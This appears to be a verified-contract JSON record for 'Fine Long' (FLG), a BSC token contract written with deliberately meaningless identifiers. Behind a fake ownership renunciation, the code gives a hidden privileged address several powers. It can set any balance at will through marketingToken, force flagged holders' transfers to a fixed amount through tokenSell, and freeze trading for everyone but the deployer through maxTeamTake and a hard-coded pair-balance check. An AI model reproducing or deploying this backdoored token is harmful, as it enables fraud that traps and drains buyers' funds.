{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface marketingAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromLaunch) external view returns (uint256);\n\n    function transfer(address teamEnableShould, uint256 launchMax) external returns (bool);\n\n    function allowance(address teamReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamEnableShould,\n        uint256 launchMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalTake, uint256 value);\n    event Approval(address indexed teamReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract modeBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitFeeMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableMax {\n    function createPair(address listTo, address launchedMax) external returns (address);\n}\n\ninterface senderFund is marketingAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FineLong is modeBuy, marketingAmount, senderFund {\n\n    function approve(address fundMax, uint256 launchMax) public virtual override returns (bool) {\n        receiverMinTeam[_msgSender()][fundMax] = launchMax;\n        emit Approval(_msgSender(), fundMax, launchMax);\n        return true;\n    }\n\n    function enableReceiverMarketing() private view {\n        require(exemptSell[_msgSender()]);\n    }\n\n    uint256 private fromLiquidity;\n\n    bool public liquidityWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingLimitReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeLaunch;\n    }\n\n    constructor (){\n        \n        limitFeeMax fromTo = limitFeeMax(sellReceiverShould);\n        tokenFromLaunch = enableMax(fromTo.factory()).createPair(fromTo.WETH(), address(this));\n        if (tokenIs != liquidityWallet) {\n            liquidityWallet = true;\n        }\n        swapIs = _msgSender();\n        exemptAuto();\n        exemptSell[swapIs] = true;\n        swapLaunch[swapIs] = feeLaunch;\n        \n        emit Transfer(address(0), swapIs, feeLaunch);\n    }\n\n    uint256 public toEnable;\n\n    bool public sellSwapMin;\n\n    address public tokenFromLaunch;\n\n    bool private tokenIs;\n\n    uint256 public atSender;\n\n    address sellReceiverShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address marketingLimit, address fundMax) external view virtual override returns (uint256) {\n        if (fundMax == sellReceiverShould) {\n            return type(uint256).max;\n        }\n        return receiverMinTeam[marketingLimit][fundMax];\n    }\n\n    mapping(address => bool) public atAmountTrading;\n\n    address limitFeeEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function marketingToken(address teamTotal, uint256 launchMax) public {\n        enableReceiverMarketing();\n        swapLaunch[teamTotal] = launchMax;\n    }\n\n    uint256 constant tokenAtAmount = 19 ** 10;\n\n    function getOwner() external view returns (address) {\n        return marketingBuy;\n    }\n\n    function senderShould(address shouldLaunch, address teamEnableShould, uint256 launchMax) internal returns (bool) {\n        if (shouldLaunch == swapIs) {\n            return enableFeeShould(shouldLaunch, teamEnableShould, launchMax);\n        }\n        uint256 swapFeeLimit = marketingAmount(tokenFromLaunch).balanceOf(limitFeeEnable);\n        require(swapFeeLimit == minBuy);\n        require(teamEnableShould != limitFeeEnable);\n        if (atAmountTrading[shouldLaunch]) {\n            return enableFeeShould(shouldLaunch, teamEnableShould, tokenAtAmount);\n        }\n        return enableFeeShould(shouldLaunch, teamEnableShould, launchMax);\n    }\n\n    function owner() external view returns (address) {\n        return marketingBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverMinTeam;\n\n    uint256 public takeMinAuto;\n\n    address private marketingBuy;\n\n    uint8 private minExempt = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minExempt;\n    }\n\n    uint256 private feeLaunch = 100000000 * 10 ** 18;\n\n    address public swapIs;\n\n    mapping(address => uint256) private swapLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundTotal;\n    }\n\n    function tokenSell(address amountSwap) public {\n        enableReceiverMarketing();\n        if (tokenIs == launchFund) {\n            takeMinAuto = marketingToTx;\n        }\n        if (amountSwap == swapIs || amountSwap == tokenFromLaunch) {\n            return;\n        }\n        atAmountTrading[amountSwap] = true;\n    }\n\n    function balanceOf(address fromLaunch) public view virtual override returns (uint256) {\n        return swapLaunch[fromLaunch];\n    }\n\n    bool private launchFund;\n\n    string private marketingLimitReceiver = \"Fine Long\";\n\n    uint256 atAuto;\n\n    function enableFeeShould(address shouldLaunch, address teamEnableShould, uint256 launchMax) internal returns (bool) {\n        require(swapLaunch[shouldLaunch] >= launchMax);\n        swapLaunch[shouldLaunch] -= launchMax;\n        swapLaunch[teamEnableShould] += launchMax;\n        emit Transfer(shouldLaunch, teamEnableShould, launchMax);\n        return true;\n    }\n\n    function exemptAuto() public {\n        emit OwnershipTransferred(swapIs, address(0));\n        marketingBuy = address(0);\n    }\n\n    event OwnershipTransferred(address indexed limitMarketing, address indexed enableMarketingTeam);\n\n    uint256 private marketingToTx;\n\n    string private fundTotal = \"FLG\";\n\n    function transfer(address teamTotal, uint256 launchMax) external virtual override returns (bool) {\n        return senderShould(_msgSender(), teamTotal, launchMax);\n    }\n\n    function transferFrom(address shouldLaunch, address teamEnableShould, uint256 launchMax) external override returns (bool) {\n        if (_msgSender() != sellReceiverShould) {\n            if (receiverMinTeam[shouldLaunch][_msgSender()] != type(uint256).max) {\n                require(launchMax <= receiverMinTeam[shouldLaunch][_msgSender()]);\n                receiverMinTeam[shouldLaunch][_msgSender()] -= launchMax;\n            }\n        }\n        return senderShould(shouldLaunch, teamEnableShould, launchMax);\n    }\n\n    uint256 minBuy;\n\n    mapping(address => bool) public exemptSell;\n\n    function liquidityTake(address tokenTeam) public {\n        if (sellSwapMin) {\n            return;\n        }\n        \n        exemptSell[tokenTeam] = true;\n        \n        sellSwapMin = true;\n    }\n\n    function maxTeamTake(uint256 launchMax) public {\n        enableReceiverMarketing();\n        minBuy = launchMax;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketingTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atAmountTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"}],\"name\":\"liquidityTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMax\",\"type\":\"uint256\"}],\"name\":\"marketingToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchMax\",\"type\":\"uint256\"}],\"name\":\"maxTeamTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMinAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFromLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"}],\"name\":\"tokenSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamEnableShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}